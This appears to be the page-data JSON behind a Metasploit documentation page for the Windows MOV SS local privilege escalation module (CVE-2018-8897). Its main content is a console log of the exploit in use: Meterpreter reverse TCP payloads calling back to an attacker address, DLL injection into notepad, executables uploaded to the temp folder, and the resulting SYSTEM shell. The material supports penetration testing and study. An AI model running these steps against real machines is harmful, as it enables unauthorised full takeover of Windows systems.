{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/mov_ss","result":{"data":{"moduleMetadataJson":{"id":"ba643b34-e4a6-5497-ade6-63cf7d9150eb","name":"Microsoft Windows POP/MOV SS Local Privilege Elevation Vulnerability","fullname":"exploit/windows/local/mov_ss","description":"This module exploits a vulnerability in a statement in the system programming guide\n        of the Intel 64 and IA-32 architectures software developer's manual being mishandled\n        in various operating system kerneles, resulting in unexpected behavior for #DB\n        excpetions that are deferred by MOV SS or POP SS.\n\n        This module will upload the pre-compiled exploit and use it to execute the final\n        payload in order to gain remote code execution.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/mov_ss","documentationSlug":"/modules/documentation/exploit/windows/local/mov_ss"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a MOV SS vulnerability that is specifically made against Microsoft Windows\n(except for Windows XP).</p>\n<p>Depending on the value of <code class=\"language-text\">USE_INJECTION</code> It will either inject a dll with the exploit\ncode into a process, or it will upload a pre-compiled exploit onto the target machine, followed\nby the final payload (such as a Meterpreter) in order to gain remote code execution.</p>\n<h2 id=\"vulnerable-target\" style=\"position:relative;\"><a href=\"#vulnerable-target\" aria-label=\"vulnerable target permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Target</h2>\n<p>Please note that this module may not work with certain hypervisors (such as VMWare). You should\ntest it on a real machine if possible.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 192.168.135.111:4567 \n[*] Sending stage (206403 bytes) to 192.168.136.142\n\nmeterpreter &gt; getuid\nServer username: DESKTOP-QGIC71I\\msfuser\nmeterpreter &gt; sysinfo\nComputer        : DESKTOP-QGIC71I\nOS              : Windows 10 (Build 16299).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nmsf5 exploit(multi/handler) &gt; use exploit/windows/local/mov_ss\nmsf5 exploit(windows/local/mov_ss) &gt; show options\n\nModule options (exploit/windows/local/mov_ss):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   EXECUTE_DELAY  3                no        The number of seconds to delay before executing the exploit if USE_INJECTION=false\n   EXPLOIT_NAME                    no        The filename to use for the exploit binary if USE_INJECTION=false (%RAND% by default).\n   PATH                            no        Path to write binaries if if USE_INJECTION=false(%TEMP% by default).\n   PAYLOAD_NAME                    no        The filename for the payload to be used on the target host if USE_INJECTION=false (%RAND%.exe by default).\n   SESSION        1                yes       The session to run this module on.\n   USE_INJECTION  true             yes       Use in-memory dll injection rather than exe file uploads.\n\n\nPayload options (generic/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.135.111  yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows x64\n\n\nmsf5 exploit(windows/local/mov_ss) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/local/mov_ss) &gt; set lhost 192.168.135.111\nlhost =&gt; 192.168.135.111\nmsf5 exploit(windows/local/mov_ss) &gt; set lport 4567\nlport =&gt; 4567\nmsf5 exploit(windows/local/mov_ss) &gt; run\n\n[*] Started reverse TCP handler on 192.168.135.111:4567 \n[*] Attempting to PrivEsc on DESKTOP-QGIC71I via session ID: 1\n[*] Checking target...\n[*] Attempting to PrivEsc on DESKTOP-QGIC71I via session ID: 1\n[*] Target Looks Good... trying to start notepad\n[*] Launching notepad to host the exploit...\n[+] Process 4964 launched.\n[*] Reflectively injecting the exploit DLL into 4964...\n[*] Exploit injected. Injecting payload into 4964...\n[*] Payload injected. Executing exploit...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (206403 bytes) to 192.168.136.142\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; exit\n[*] Shutting down Meterpreter...\n\n[*] 192.168.136.142 - Meterpreter session 3 closed.  Reason: User exit\nmsf5 exploit(windows/local/mov_ss) &gt; set USE_INJECTION false\nUSE_INJECTION =&gt; false\nmsf5 exploit(windows/local/mov_ss) &gt; run\n\n[*] Started reverse TCP handler on 192.168.135.111:4567 \n[*] Attempting to PrivEsc on DESKTOP-QGIC71I via session ID: 1\n[*] Exploit uploaded on DESKTOP-QGIC71I to C:\\Users\\msfuser\\AppData\\Local\\Temp\\ACLgNJAJ.exe\n[*] Payload (7168 bytes) uploaded on DESKTOP-QGIC71I to C:\\Users\\msfuser\\AppData\\Local\\Temp\\kWDncKCjHtb.exe\n[*] Running exploit C:\\Users\\msfuser\\AppData\\Local\\Temp\\ACLgNJAJ.exe with payload C:\\Users\\msfuser\\AppData\\Local\\Temp\\kWDncKCjHtb.exe\n[*] Sending stage (206403 bytes) to 192.168.136.142\n^C[-] Exploit failed: Interrupt \nmsf5 exploit(windows/local/mov_ss) &gt; sessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                                Connection\n  --  ----  ----                     -----------                                ----------\n  1         meterpreter x64/windows  DESKTOP-QGIC71I\\msfuser @ DESKTOP-QGIC71I  192.168.135.111:4567 -&gt; 192.168.136.142:49696 (192.168.136.142)\n  4         meterpreter x64/windows  NT AUTHORITY\\SYSTEM @ DESKTOP-QGIC71I      192.168.135.111:4567 -&gt; 192.168.136.142:49699 (192.168.136.142)\n\nmsf5 exploit(windows/local/mov_ss) &gt; exit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"build-instructions\" style=\"position:relative;\"><a href=\"#build-instructions\" aria-label=\"build instructions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Build Instructions</h2>\n<p>For both the dll and exe, use Visual studio solutions found in\n./external/source/exploits/cve-2018-8897\nthen copy the resulting binaries to\n./data/exploits/cve-2018-8897</p>"}}},"pageContext":{"id":"ba643b34-e4a6-5497-ade6-63cf7d9150eb"}}}